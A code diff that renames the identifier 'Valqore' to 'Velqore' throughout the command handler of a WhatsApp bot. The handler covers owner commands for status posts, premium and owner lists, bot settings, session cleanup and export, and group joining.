-               replygcValqore(mess.done)
+               replygcVelqore(mess.done)
             }
             break
             case 'setmenu':{
-               if (!ValqoreTheCreator) return ValqoreStickOwner()
-               if (!text) return replygcValqore(`There are 8 menu(v1,v2,v3,v4,v5,v6,v7,v8)\nPlease select one\nExample ${prefix + command} v1`)
+               if (!VelqoreTheCreator) return VelqoreStickOwner()
+               if (!text) return replygcVelqore(`There are 8 menu(v1,v2,v3,v4,v5,v6,v7,v8)\nPlease select one\nExample ${prefix + command} v1`)
                if (text.startsWith('v')) {
                   typemenu = text
-                  replygcValqore(mess.done)
+                  replygcVelqore(mess.done)
                } else {
-                  replygcValqore(`There are 8 menu(v1,v2,v3,v4,v5,v6,v7,v8)\nPlease select one\nExample ${prefix + command} v1`)
+                  replygcVelqore(`There are 8 menu(v1,v2,v3,v4,v5,v6,v7,v8)\nPlease select one\nExample ${prefix + command} v1`)
                }
             }
             break
             case 'setreply':{
-               if (!ValqoreTheCreator) return ValqoreStickOwner()
-               if (!text) return replygcValqore(`There are 3 reply(v1,v2,v3)\nPlease select 1\nExample ${prefix+command} v1`)
+               if (!VelqoreTheCreator) return VelqoreStickOwner()
+               if (!text) return replygcVelqore(`There are 3 reply(v1,v2,v3)\nPlease select 1\nExample ${prefix+command} v1`)
                if (text.startsWith('v')) {
                   typereply = text
-                  replygcValqore(mess.done)
+                  replygcVelqore(mess.done)
                } else {
-                  replygcValqore(`There are 3 reply(v1,v2,v3)\nPlease select 1\nExample ${prefix+command} v1`)
+                  replygcVelqore(`There are 3 reply(v1,v2,v3)\nPlease select 1\nExample ${prefix+command} v1`)
                }
             }
             break
             case 'statustext': 
             case 'upswteks': {
-               if (!ValqoreTheCreator) return ValqoreStickOwner()
-               if (!q) return replygcValqore('Text?')
-               await ValqoreInc.sendMessage('status@broadcast', { text: q }, { backgroundColor: '#FF000000', font: 3, statusJidList: Object.keys(global.db.data.users) })
-               replygcValqore(mess.done)
+               if (!VelqoreTheCreator) return VelqoreStickOwner()
+               if (!q) return replygcVelqore('Text?')
+               await VelqoreInc.sendMessage('status@broadcast', { text: q }, { backgroundColor: '#FF000000', font: 3, statusJidList: Object.keys(global.db.data.users) })
+               replygcVelqore(mess.done)
             }
             break
             case 'statusvideo':
             case 'upswvideo': {
-               if (!ValqoreTheCreator) return ValqoreStickOwner()
+               if (!VelqoreTheCreator) return VelqoreStickOwner()
                if (/video/.test(mime)) {
-                  var videosw = await ValqoreInc.downloadAndSaveMediaMessage(quoted)
-                  await ValqoreInc.sendMessage('status@broadcast', {
+                  var videosw = await VelqoreInc.downloadAndSaveMediaMessage(quoted)
+                  await VelqoreInc.sendMessage('status@broadcast', {
                      video: {
                         url: videosw
                      },
                      caption: q ? q : ''
                   }, { statusJidList: Object.keys(global.db.data.users) })
-                  await replygcValqore(mess.done)
+                  await replygcVelqore(mess.done)
                } else {
-                  replygcValqore('Reply to video')
+                  replygcVelqore('Reply to video')
                }
             }
             break
             case 'statusimg':
             case 'statusimage':
             case 'upswimg': {
-               if (!ValqoreTheCreator) return ValqoreStickOwner()
+               if (!VelqoreTheCreator) return VelqoreStickOwner()
                if (/image/.test(mime)) {
-                  var imagesw = await ValqoreInc.downloadAndSaveMediaMessage(quoted)
-                  await ValqoreInc.sendMessage('status@broadcast', {
+                  var imagesw = await VelqoreInc.downloadAndSaveMediaMessage(quoted)
+                  await VelqoreInc.sendMessage('status@broadcast', {
                      image: {
                         url: imagesw
                      },
                      caption: q ? q : ''
                   }, { statusJidList: Object.keys(global.db.data.users)})
-                  await replygcValqore(mess.done)
+                  await replygcVelqore(mess.done)
                } else {
-                  replygcValqore('Reply to image')
+                  replygcVelqore('Reply to image')
                }
             }
             break
             case 'statusaudio':
             case 'upswaudio': {
-               if (!ValqoreTheCreator) return ValqoreStickOwner()
+               if (!VelqoreTheCreator) return VelqoreStickOwner()
                if (/audio/.test(mime)) {
-                  var audiosw = await ValqoreInc.downloadAndSaveMediaMessage(quoted)
-                  await ValqoreInc.sendMessage('status@broadcast', {
+                  var audiosw = await VelqoreInc.downloadAndSaveMediaMessage(quoted)
+                  await VelqoreInc.sendMessage('status@broadcast', {
                      audio: {
                         url: audiosw
                      },
@@ -1317,109 +1313,109 @@ fs.writeFileSync('./src/data/role/user.json', JSON.stringify(Valqoreverifieduser
                      backgroundColor: '#FF000000',
                      statusJidList: Object.keys(global.db.data.users)
                   })
-                  await replygcValqore(mess.done)
+                  await replygcVelqore(mess.done)
                } else {
-                  replygcValqore('Reply to audio')
+                  replygcVelqore('Reply to audio')
                }
             }
             break
             case 'setimgmenu':
             case 'sim': {
-                if (!ValqoreTheCreator) return ValqoreStickOwner()
-                let delb = await ValqoreInc.downloadAndSaveMediaMessage(quoted)
-                await fsx.copy(delb, './ValqoreMedia/theme/cheemspic.jpg')
+                if (!VelqoreTheCreator) return VelqoreStickOwner()
+                let delb = await VelqoreInc.downloadAndSaveMediaMessage(quoted)
+                await fsx.copy(delb, './VelqoreMedia/theme/cheemspic.jpg')
                 fs.unlinkSync(delb)
-                replygcValqore(mess.done)
+                replygcVelqore(mess.done)
             }
             break
             case 'setvidmenu':
             case 'svm': 
             	case 'setvgifmenu':
             case 'sgm': {
-                if (!ValqoreTheCreator) return ValqoreStickOwner()
-                let delb = await ValqoreInc.downloadAndSaveMediaMessage(quoted)
-                await fsx.copy(delb, './ValqoreMedia/theme/Cheems-bot.mp4')
+                if (!VelqoreTheCreator) return VelqoreStickOwner()
+                let delb = await VelqoreInc.downloadAndSaveMediaMessage(quoted)
+                await fsx.copy(delb, './VelqoreMedia/theme/Cheems-bot.mp4')
                 fs.unlinkSync(delb)
-                replygcValqore(mess.done)
+                replygcVelqore(mess.done)
             }
             break
             case 'addtitle':{
-               if (!ValqoreTheCreator) return ValqoreStickOwner()
-               if (!text) return replygcValqore(`Usage ${prefix + command} number|title`)
+               if (!VelqoreTheCreator) return VelqoreStickOwner()
+               if (!text) return replygcVelqore(`Usage ${prefix + command} number|title`)
                nonya = text.split('|')[0]
                titlenya = text.split('|')[1]
                let oo = `${nonya}@s.whatsapp.net`
                db.data.users[oo].title = titlenya
-               await replygcValqore(mess.done)
+               await replygcVelqore(mess.done)
             }
             break
             case 'deltitle':{
-               if (!ValqoreTheCreator) return ValqoreStickOwner()
-               if (!text) return replygcValqore(`Usage ${prefix + command} number`)
+               if (!VelqoreTheCreator) return VelqoreStickOwner()
+               if (!text) return replygcVelqore(`Usage ${prefix + command} number`)
                nonya = text.split(',')[0]
                let oo = `${nonya}@s.whatsapp.net`
                db.data.users[oo].title = ''
-               await replygcValqore(mess.done)
+               await replygcVelqore(mess.done)
             }
             break
             case 'addlimit':
             case 'givelimit':{
-                if (!ValqoreTheCreator) return ValqoreStickOwner()
-                if (!text) return replygcValqore(`Usage ${prefix + command} number|limit amount`)
+                if (!VelqoreTheCreator) return VelqoreStickOwner()
+                if (!text) return replygcVelqore(`Usage ${prefix + command} number|limit amount`)
                 usernya = text.split('|')[0]
                 limitnya = text.split('|')[1]
                 let oo = `${usernya}@s.whatsapp.net`
                 db.data.users[oo].limit += limitnya
-                replygcValqore(mess.done)
+                replygcVelqore(mess.done)
             }
             break
             case 'dellimit':{
-                if (!ValqoreTheCreator) return ValqoreStickOwner()
-                if (!text) return replygcValqore(`Usage ${prefix + command} number|limit amount`)
+                if (!VelqoreTheCreator) return VelqoreStickOwner()
+                if (!text) return replygcVelqore(`Usage ${prefix + command} number|limit amount`)
                 usernya = text.split('|')[0]
                 limitnya = text.split('|')[1]
-                if (db.data.users[usernya + '@s.whatsapp.net'].limit < limitnya) return replygcValqore(`His Limit Is Less Than ${limitnya}`)
+                if (db.data.users[usernya + '@s.whatsapp.net'].limit < limitnya) return replygcVelqore(`His Limit Is Less Than ${limitnya}`)
                 db.data.users[usernya + '@s.whatsapp.net'].limit -= limitnya
-                replygcValqore(mess.done)
+                replygcVelqore(mess.done)
             }
             break
             case 'addprem':
-                if (!ValqoreTheCreator) return ValqoreStickOwner()
+                if (!VelqoreTheCreator) return VelqoreStickOwner()
                 if (args.length < 2)
-                    return replygcValqore(`Usage ${prefix + command} @tag time\n${prefix + command} number time\n\nExample : ${prefix + command} @tag 30d`)
+                    return replygcVelqore(`Usage ${prefix + command} @tag time\n${prefix + command} number time\n\nExample : ${prefix + command} @tag 30d`)
                 if (m.mentionedJid.length !== 0) {
                     for (let i = 0; i < m.mentionedJid.length; i++) {
                         addPremiumUser(m.mentionedJid[0], args[1], premium)
                     }
-                    replygcValqore("Premium Success")
+                    replygcVelqore("Premium Success")
                 } else {
                     addPremiumUser(args[0] + "@s.whatsapp.net", args[1], premium)
-                    replygcValqore("Premium Success")
+                    replygcVelqore("Premium Success")
                 }
             break
             case 'delprem':
-                if (!ValqoreTheCreator) return ValqoreStickOwner()
-                if (args.length < 1) return replygcValqore(`Usage ${prefix + command} @tag\n${prefix + command} number\n\nExample : ${prefix + command} 918130784851`)
+                if (!VelqoreTheCreator) return VelqoreStickOwner()
+                if (args.length < 1) return replygcVelqore(`Usage ${prefix + command} @tag\n${prefix + command} number\n\nExample : ${prefix + command} 918130784851`)
                 if (m.mentionedJid.length !== 0) {
                     for (let i = 0; i < m.mentionedJid.length; i++) {
                         premium.splice(getPremiumPosition(m.mentionedJid[i], premium), 1)
                         fs.writeFileSync("./src/data/role/premium.json", JSON.stringify(premium))
                     }
-                    replygcValqore("Delete Success")
+                    replygcVelqore("Delete Success")
                 } else {
                     premium.splice(getPremiumPosition(args[0] + "@s.whatsapp.net", premium), 1)
                     fs.writeFileSync("./src/data/role/premium.json", JSON.stringify(premium))
-                    replygcValqore("Delete Success")
+                    replygcVelqore("Delete Success")
                 }
             break
             case 'listprem': {
-                if (!ValqoreTheCreator) return ValqoreStickOwner()
+                if (!VelqoreTheCreator) return VelqoreStickOwner()
                 let data = require('./src/data/role/premium.json')
                 let txt = `*------「 LIST PREMIUM 」------*\n\n`
                 for (let x of data) {
                     txt += `Number : ${x.id}\n`
                     txt += `Expire In: ${x.expired} ms\n`
-                ValqoreInc.sendMessage(m.chat, {
+                VelqoreInc.sendMessage(m.chat, {
                     text: txt,
                     mentions: x
                 }, {
@@ -1429,23 +1425,23 @@ fs.writeFileSync('./src/data/role/user.json', JSON.stringify(Valqoreverifieduser
             }
             break
 case 'addowner':
-if (!ValqoreTheCreator) return ValqoreStickOwner()
-if (!args[0]) return replygcValqore(`Use ${prefix+command} number\nExample ${prefix+command} ${ownernumber}`)
+if (!VelqoreTheCreator) return VelqoreStickOwner()
+if (!args[0]) return replygcVelqore(`Use ${prefix+command} number\nExample ${prefix+command} ${ownernumber}`)
 bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
-let ceknye = await ValqoreInc.onWhatsApp(bnnd)
-if (ceknye.length == 0) return replygcValqore(`Enter A Valid And Registered Number On WhatsApp!!!`)
+let ceknye = await VelqoreInc.onWhatsApp(bnnd)
+if (ceknye.length == 0) return replygcVelqore(`Enter A Valid And Registered Number On WhatsApp!!!`)
 owner.push(bnnd)
 fs.writeFileSync('./src/data/role/owner.json', JSON.stringify(owner))
-replygcValqore(`Number ${bnnd} Has Become An Owner!!!`)
+replygcVelqore(`Number ${bnnd} Has Become An Owner!!!`)
 break
 case 'delowner':
-if (!ValqoreTheCreator) return ValqoreStickOwner()
-if (!args[0]) return replygcValqore(`Use ${prefix+command} nomor\nExample ${prefix+command} 918130784851`)
+if (!VelqoreTheCreator) return VelqoreStickOwner()
+if (!args[0]) return replygcVelqore(`Use ${prefix+command} nomor\nExample ${prefix+command} 918130784851`)
 ya = q.split("|")[0].replace(/[^0-9]/g, '')
 unp = owner.indexOf(ya)
 owner.splice(unp, 1)
 fs.writeFileSync('./src/data/role/owner.json', JSON.stringify(owner))
-replygcValqore(`The Numbrr ${ya} Has been deleted from owner list by the owner!!!`)
+replygcVelqore(`The Numbrr ${ya} Has been deleted from owner list by the owner!!!`)
 break
 case 'listowner': {
                 let teks = '┌──⭓「 *List Owner* 」\n│\n'
@@ -1453,54 +1449,54 @@ case 'listowner': {
                     teks += `│⭔ ${x}\n`
                 }
                 teks += `│\n└────────────⭓\n\n*Total : ${owner.length}*`
-                replygcValqore(teks)
+                replygcVelqore(teks)
             }
             break
             case 'delsession':
             case 'clearsession': {
-                if (!ValqoreTheCreator) return ValqoreStickOwner()
+                if (!VelqoreTheCreator) return VelqoreStickOwner()
                 fs.readdir("./session", async function(err, files) {
                     if (err) {
                         console.log('Unable to scan directory: ' + err);
-                        return replygcValqore('Unable to scan directory: ' + err);
+                        return replygcVelqore('Unable to scan directory: ' + err);
                     }
                     let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
                         item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
                     )
                     console.log(filteredArray.length);
                     let teks = `Detected ${filteredArray.length} junk files\n\n`
-                    if (filteredArray.length == 0) return replygcValqore(teks)
+                    if (filteredArray.length == 0) return replygcVelqore(teks)
                     filteredArray.map(function(e, i) {
                         teks += (i + 1) + `. ${e}\n`
                     })
-                    replygcValqore(teks)
+                    replygcVelqore(teks)
                     await sleep(2000)
-                    replygcValqore("Deleting junk files...")
+                    replygcVelqore("Deleting junk files...")
                     await filteredArray.forEach(function(file) {
                         fs.unlinkSync(`./session/${file}`)
                     });
                     await sleep(2000)
-                    replygcValqore("Successfully deleted all the trash in the session folder")
+                    replygcVelqore("Successfully deleted all the trash in the session folder")
                 });
             }
             break
             case 'join':
                 try {
-                    if (!ValqoreTheCreator) return ValqoreStickOwner()
-                    if (!text) return replygcValqore('Enter Group Link!')
-                    if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return replygcValqore('Link Invalid!')
+                    if (!VelqoreTheCreator) return VelqoreStickOwner()
+                    if (!text) return replygcVelqore('Enter Group Link!')
+                    if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return replygcVelqore('Link Invalid!')
                     let result = args[0].split('https://chat.whatsapp.com/')[1]
-                    ValqoreInc.groupAcceptInvite(result)
-                    await replygcValqore(`Done`)
+                    VelqoreInc.groupAcceptInvite(result)
+                    await replygcVelqore(`Done`)
                 } catch {
-                    replygcValqore('Failed to join the Group')
+                    replygcVelqore('Failed to join the Group')
                 }
                 break
             case 'getsession':
-                if (!ValqoreTheCreator) return ValqoreStickOwner()
-                replygcValqore('Wait a moment, currently retrieving your session file')
+                if (!VelqoreTheCreator) return VelqoreStickOwner()
+                replygcVelqore('Wait a moment, currently retrieving your session file')
                 let sesi = fs.readFileSync('./session/creds.json')
-                ValqoreInc.sendMessage(m.chat, {
+                VelqoreInc.sendMessage(m.chat, {
                     document: sesi,
                     mimetype: 'application/json',
                     fileName: 'creds.json'
@@ -1510,7 +1506,7 @@ case 'listowner': {
             break
             case 'myip':
             case 'ipbot':
-                if (!ValqoreTheCreator) return ValqoreStickOwner()
+                if (!VelqoreTheCreator) return VelqoreStickOwner()
                 var http = require('http')
                 http.get({
                     'host': 'api.ipify.org',
@@ -1518,12 +1514,12 @@ case 'listowner': {
                     'path': '/'
                 }, function(resp) {
                     resp.on('data', function(ip) {
-                        replygcValqore("🔎 My public IP address is: " + ip);
+                        replygcVelqore("🔎 My public IP address is: " + ip);
                     })
                 })
             break
             case 'request': case 'reportbug': {
-	if (!text) return replygcValqore(`Example : ${
+	if (!text) return replygcVelqore(`Example : ${
         prefix + command
       } hi dev play command is not working`)
             textt = `*| REQUEST/BUG |*`
@@ -1532,14 +1528,14 @@ case 'listowner': {
   }\n*Request/Bug* : ${text}`
             teks2 = `\n\n*Hii ${pushname},You request has been forwarded to my Owners*.\n*Please wait...*`
             for (let i of owner) {
-                ValqoreInc.sendMessage(i + "@s.whatsapp.net", {
+                VelqoreInc.sendMessage(i + "@s.whatsapp.net", {
                     text: textt + teks1,
                     mentions: [m.sender],
                 }, {
                     quoted: m,
                 })
             }
-            ValqoreInc.sendMessage(m.chat, {
+            VelqoreInc.sendMessage(m.chat, {
                 text: textt + teks2 + teks1,
                 mentions: [m.sender],
             }, {
@@ -1549,212 +1545,212 @@ case 'listowner': {
         }
         break
             case 'shutdown':
-                if (!ValqoreTheCreator) return ValqoreStickOwner()
-                replygcValqore(`Restarting will be completed in seconds`)
+                if (!VelqoreTheCreator) return VelqoreStickOwner()
+                replygcVelqore(`Restarting will be completed in seconds`)
                 await sleep(3000)
                 process.exit()
             break
             case 'autoread':
-                if (!ValqoreTheCreator) return ValqoreStickOwner()
-                if (args.length < 1) return replygcValqore(`Example ${prefix + command} on/off`)
+                if (!VelqoreTheCreator) return VelqoreStickOwner()
+                if (args.length < 1) return replygcVelqore(`Example ${prefix + command} on/off`)
                 if (q === 'on') {
                     db.data.settings[botNumber].autoread = true
-                    replygcValqore(`Successfully changed autoread to ${q}`)
+                    replygcVelqore(`Successfully changed autoread to ${q}`)
                 } else if (q === 'off') {
                     db.data.settings[botNumber].autoread = false
-                    replygcValqore(`Successfully changed autoread to ${q}`)
+                    replygcVelqore(`Successfully changed autoread to ${q}`)
                 }
             break
             case 'unavailable':
-                if (!ValqoreTheCreator) return ValqoreStickOwner()
-                if (args.length < 1) return replygcValqore(`Example ${prefix + command} on/off`)
+                if (!VelqoreTheCreator) return VelqoreStickOwner()
+                if (args.length < 1) return replygcVelqore(`Example ${prefix + command} on/off`)
                 if (q === 'on') {
                     db.data.settings[botNumber].online = true
-                    replygcValqore(`Successfully changed unavailable to ${q}`)
+                    replygcVelqore(`Successfully changed unavailable to ${q}`)
                 } else if (q === 'off') {
                     db.data.settings[botNumber].online = false
-                    replygcValqore(`Successfully changed unavailable to ${q}`)
+                    replygcVelqore(`Successfully changed unavailable to ${q}`)
                 }
             break
             case 'autorecordtype':
-                if (!ValqoreTheCreator) return ValqoreStickOwner()
-                if (args.length < 1) return replygcValqore(`Example ${prefix + command} on/off`)
+                if (!VelqoreTheCreator) return VelqoreStickOwner()
+                if (args.length < 1) return replygcVelqore(`Example ${prefix + command} on/off`)
                 if (q === 'on') {
                     db.data.settings[botNumber].autorecordtype = true
-                    replygcValqore(`Successfully changed Auto-RecordingTyping to ${q}`)
+                    replygcVelqore(`Successfully changed Auto-RecordingTyping to ${q}`)
                 } else if (q === 'off') {
                     db.data.settings[botNumber].autorecordtype = false
-                    replygcValqore(`Successfully changed Auto-RecordingTyping to ${q}`)
+                    replygcVelqore(`Successfully changed Auto-RecordingTyping to ${q}`)
                 }
             break
             case 'autorecord':
-                if (!ValqoreTheCreator) return ValqoreStickOwner()
-                if (args.length < 1) return replygcValqore(`Example ${prefix + command} on/off`)
+                if (!VelqoreTheCreator) return VelqoreStickOwner()
+                if (args.length < 1) return replygcVelqore(`Example ${prefix + command} on/off`)
                 if (q === 'on') {
                     db.data.settings[botNumber].autorecord = true
-                    replygcValqore(`Successfully changed Auto-Recording to ${q}`)
+                    replygcVelqore(`Successfully changed Auto-Recording to ${q}`)
                 } else if (q === 'off') {
                     db.data.settings[botNumber].autorecord = false
-                    replygcValqore(`Successfully changed Auto-Recording to ${q}`)
+                    replygcVelqore(`Successfully changed Auto-Recording to ${q}`)
                 }
             break
             case 'autotype':
-                if (!ValqoreTheCreator) return ValqoreStickOwner()
-                if (args.length < 1) return replygcValqore(`Example ${prefix + command} on/off`)
+                if (!VelqoreTheCreator) return VelqoreStickOwner()
+                if (args.length < 1) return replygcVelqore(`Example ${prefix + command} on/off`)
                 if (q === 'on') {
                     db.data.settings[botNumber].autotype = true
-                    replygcValqore(`Successfully changed Auto-Typing to ${q}`)
+                    replygcVelqore(`Successfully changed Auto-Typing to ${q}`)
                 } else if (q === 'off') {
                     db.data.settings[botNumber].autotype = false
-                    replygcValqore(`Successfully changed Auto-Typing to ${q}`)
+                    replygcVelqore(`Successfully changed Auto-Typing to ${q}`)
                 }
             break
             case 'autobio':
-                if (!ValqoreTheCreator) return ValqoreStickOwner()
-                if (args.length < 1) return replygcValqore(`Example ${prefix + command} on/off`)
+                if (!VelqoreTheCreator) return VelqoreStickOwner()
+                if (args.length < 1) return replygcVelqore(`Example ${prefix + command} on/off`)
                 if (q == 'on') {
                     db.data.settings[botNumber].autobio = true
-                    replygcValqore(`Successfully Changed AutoBio To ${q}`)
+                    replygcVelqore(`Successfully Changed AutoBio To ${q}`)
                 } else if (q == 'off') {
                     db.data.settings[botNumber].autobio = false
-                    replygcValqore(`Successfully Changed AutoBio To ${q}`)
+                    replygcVelqore(`Successfully Changed AutoBio To ${q}`)
                 }
             break
             case 'autosticker': case 'autostickergc':
-                if (!m.isGroup) return ValqoreStickGroup()
-if (!isBotAdmins) return ValqoreStickBotAdmin()
-if (!isAdmins && !ValqoreTheCreator) return ValqoreStickAdmin()
-                if (args.length < 1) return replygcValqore(`Example ${prefix + command} on/off`)
+                if (!m.isGroup) return VelqoreStickGroup()
+if (!isBotAdmins) return VelqoreStickBotAdmin()
+if (!isAdmins && !VelqoreTheCreator) return VelqoreStickAdmin()
+                if (args.length < 1) return replygcVelqore(`Example ${prefix + command} on/off`)
                 if (q == 'on') {
                     db.data.settings[botNumber].autosticker = true
-                    replygcValqore(`Successfully Changed AutoBio To ${q}`)
+                    replygcVelqore(`Successfully Changed AutoBio To ${q}`)
                 } else if (q == 'off') {
                     db.data.settings[botNumber].autosticker = false
-                    replygcValqore(`Successfully Changed AutoBio To ${q}`)
+                    replygcVelqore(`Successfully Changed AutoBio To ${q}`)
                 }
             break
             case 'autoblock':
-                if (!ValqoreTheCreator) return ValqoreStickOwner()
-                if (args.length < 1) return replygcValqore(`Example ${prefix + command} on/off`)
+                if (!VelqoreTheCreator) return VelqoreStickOwner()
+                if (args.length < 1) return replygcVelqore(`Example ${prefix + command} on/off`)
                 if (q == 'on') {
                     db.data.settings[botNumber].autoblocknum = true
-                    replygcValqore(`Successfully Changed Auto-Block To ${q}`)
+                    replygcVelqore(`Successfully Changed Auto-Block To ${q}`)
                 } else if (q == 'off') {
                     db.data.settings[botNumber].autoblocknum = false
-                    replygcValqore(`Successfully Changed Auto-Block To ${q}`)
+                    replygcVelqore(`Successfully Changed Auto-Block To ${q}`)
                 }
             break
             case 'onlygroup':
             case 'onlygc':
-                if (!ValqoreTheCreator) return ValqoreStickOwner()
-                if (args.length < 1) return replygcValqore(`Example ${prefix + command} on/off`)
+                if (!VelqoreTheCreator) return VelqoreStickOwner()
+                if (args.length < 1) return replygcVelqore(`Example ${prefix + command} on/off`)
                 if (q == 'on') {
                     db.data.settings[botNumber].onlygrub = true
-                    replygcValqore(`Successfully Changed Onlygroup To ${q}`)
+                    replygcVelqore(`Successfully Changed Onlygroup To ${q}`)
                 } else if (q == 'off') {
                     db.data.settings[botNumber].onlygrub = false
-                    replygcValqore(`Successfully Changed Onlygroup To ${q}`)
+                    replygcVelqore(`Successfully Changed Onlygroup To ${q}`)
                 }
             break
             case 'onlyprivatechat':
             case 'onlypc':
-                if (!ValqoreTheCreator) return ValqoreStickOwner()
-                if (args.length < 1) return replygcValqore(`Example ${prefix + command} on/off`)
+                if (!VelqoreTheCreator) return VelqoreStickOwner()
+                if (args.length < 1) return replygcVelqore(`Example ${prefix + command} on/off`)
                 if (q == 'on') {
                     db.data.settings[botNumber].onlypc = true
-                    replygcValqore(`Successfully Changed Only-Pc To ${q}`)
+                    replygcVelqore(`Successfully Changed Only-Pc To ${q}`)
                 } else if (q == 'off') {
                     db.data.settings[botNumber].onlypc = false
-                    replygcValqore(`Successfully Changed Only-Pc To ${q}`)
+                    replygcVelqore(`Successfully Changed Only-Pc To ${q}`)
                 }
             break
             case 'onlyindia':
             case 'onlyindianumber':
-                if (!ValqoreTheCreator) return ValqoreStickOwner()
-                if (args.length < 1) return replygcValqore(`Example ${prefix + command} on/off`)
+                if (!VelqoreTheCreator) return VelqoreStickOwner()
+                if (args.length < 1) return replygcVelqore(`Example ${prefix + command} on/off`)
                 if (q == 'on') {
                     db.data.settings[botNumber].onlyindia = true
-                    replygcValqore(`Successfully Changed Only-Indian To ${q}`)
+                    replygcVelqore(`Successfully Changed Only-Indian To ${q}`)
                 } else if (q == 'off') {
                     db.data.settings[botNumber].onlyindia = false
-                    replygcValqore(`Successfully Changed Only-Indian To ${q}`)
+                    replygcVelqore(`Successfully Changed Only-Indian To ${q}`)
                 }
             break
             case 'onlyindo':
             case 'onlyindonumber':
-                if (!ValqoreTheCreator) return ValqoreStickOwner()
-                if (args.length < 1) return replygcValqore(`Example ${prefix + command} on/off`)
+                if (!VelqoreTheCreator) return VelqoreStickOwner()
+                if (args.length < 1) return replygcVelqore(`Example ${prefix + command} on/off`)
                 if (q == 'on') {
                     db.data.settings[botNumber].onlyindo = true
-                    replygcValqore(`Successfully Changed Only-Indonesian To ${q}`)
+                    replygcVelqore(`Successfully Changed Only-Indonesian To ${q}`)
                 } else if (q == 'off') {
                     db.data.settings[botNumber].onlyindo = false
-                    replygcValqore(`Successfully Changed Only-Indonesian To ${q}`)
+                    replygcVelqore(`Successfully Changed Only-Indonesian To ${q}`)
                 }
             break
             case 'self': {
-                if (!ValqoreTheCreator) return ValqoreStickOwner()
-                ValqoreInc.public = false
-                replygcValqore('*Successful in Changing To Self Usage*')
+                if (!VelqoreTheCreator) return VelqoreStickOwner()
+                VelqoreInc.public = false
+                replygcVelqore('*Successful in Changing To Self Usage*')
             }
             break
             case 'public': {
-                if (!ValqoreTheCreator) return ValqoreStickOwner()
-                ValqoreInc.public = true
-                replygcValqore('*Successful in Changing To Public Usage*')
+                if (!VelqoreTheCreator) return VelqoreStickOwner()
+                VelqoreInc.public = true
+                replygcVelqore('*Successful in Changing To Public Usage*')
             }
             break
             case 'mode':
-                if (!ValqoreTheCreator) return ValqoreStickOwner()
-                if (args.length < 1) return replygcValqore(`Example ${prefix + command} public/self`)
+                if (!VelqoreTheCreator) return VelqoreStickOwner()
+                if (args.length < 1) return replygcVelqore(`Example ${prefix + command} public/self`)
                 if (q == 'public') {
-                    ValqoreInc.public = true
-                    replygcValqore(mess.done)
+                    VelqoreInc.public = true
+                    replygcVelqore(mess.done)
                 } else if (q == 'self') {
-                    ValqoreInc.public = false
-                    replygcValqore(mess.done)
+                    VelqoreInc.public = false
+                    replygcVelqore(mess.done)
                 }
             break
             case 'setexif':
             case 'setwm':
-                if (!ValqoreTheCreator) return ValqoreStickOwner()
-                if (!text) return replygcValqore(`Example : ${prefix + command} packname|author`)
+                if (!VelqoreTheCreator) return VelqoreStickOwner()
+                if (!text) return replygcVelqore(`Example : ${prefix + command} packname|author`)
                 global.packname = text.split("|")[0]
                 global.author = text.split("|")[1]
-                replygcValqore(`Exif successfully changed to\n\n• Packname : ${global.packname}\n• Author : ${global.author}`)
+                replygcVelqore(`Exif successfully changed to\n\n• Packname : ${global.packname}\n• Author : ${global.author}`)
                 break
                 case 'setprefix':
-                if (!ValqoreTheCreator) return ValqoreStickOwner()
-                if (!text) return replygcValqore(`Example : ${prefix + command} packname|author`)
+                if (!VelqoreTheCreator) return VelqoreStickOwner()
+                if (!text) return replygcVelqore(`Example : ${prefix + command} packname|author`)
                 global.xprefix = text
-                replygcValqore(`Prefix successfully changed to ${text}`)
+                replygcVelqore(`Prefix successfully changed to ${text}`)
                 break
                 case 'setautoblock':
-                if (!ValqoreTheCreator) return ValqoreStickOwner()
-                if (!text) return replygcValqore(`Example : ${prefix + command} packname|author`)
+                if (!VelqoreTheCreator) return VelqoreStickOwner()
+                if (!text) return replygcVelqore(`Example : ${prefix + command} packname|author`)
                 global.autoblocknumber = text
-                replygcValqore(`Auto-Block number successfully changed to ${text}`)
+                replygcVelqore(`Auto-Block number successfully changed to ${text}`)
                 break
                 case 'setantiforeign':
-                if (!ValqoreTheCreator) return ValqoreStickOwner()
-                if (!text) return replygcValqore(`Example : ${prefix + command} packname|author`)
+                if (!VelqoreTheCreator) return VelqoreStickOwner()
+                if (!text) return replygcVelqore(`Example : ${prefix + command} packname|author`)
                 global.antiforeignnumber = text
-                replygcValqore(`Anti-foreign number successfully changed to ${text}`)
+                replygcVelqore(`Anti-foreign number successfully changed to ${text}`)
                 break
             case 'setbotpp':
             case 'setpp':
             case 'setpp':
             case 'setppbot':
-                if (!ValqoreTheCreator) return ValqoreStickOwner()
-                if (!quoted) return replygcValqore(`Send/Reply Image With Caption ${prefix + command}`)
-                if (!/image/.test(mime)) return replygcValqore(`Send/Reply Image With Caption ${prefix + command}`)
-                if (/webp/.test(mime)) return replygcValqore(`Send/Reply Image With Caption ${prefix + command}`)
-                var medis = await ValqoreInc.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
+                if (!VelqoreTheCreator) return VelqoreStickOwner()
+                if (!quoted) return replygcVelqore(`Send/Reply Image With Caption ${prefix + command}`)
+                if (!/image/.test(mime)) return replygcVelqore(`Send/Reply Image With Caption ${prefix + command}`)
+                if (/webp/.test(mime)) return replygcVelqore(`Send/Reply Image With Caption ${prefix + command}`)
+                var medis = await VelqoreInc.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                 if (args[0] == 'full') {
                     var {
                         img
                     } = await generateProfilePicture(medis)
-                    await ValqoreInc.query({
+                    await VelqoreInc.query({
                         tag: 'iq',
                         attrs: {
                             to: botNumber,
@@ -1770,101 +1766,101 @@ if (!isAdmins && !ValqoreTheCreator) return ValqoreStickAdmin()
                         }]
                     })
                     fs.unlinkSync(medis)
-                    replygcValqore(mess.done)
+                    replygcVelqore(mess.done)
                 } else {
-                    var memeg = await ValqoreInc.updateProfilePicture(botNumber, {
+                    var memeg = await VelqoreInc.updateProfilePicture(botNumber, {
                         url: medis
                     })
                     fs.unlinkSync(medis)
-                    replygcValqore(mess.done)
+                    replygcVelqore(mess.done)
                 }
                 break
             case 'leave':
             case 'out':
-                if (!ValqoreTheCreator) return ValqoreStickOwner()
-                if (!m.isGroup) return ValqoreStickGroup()
-                replygcValqore('Bye Everyone 🥺')
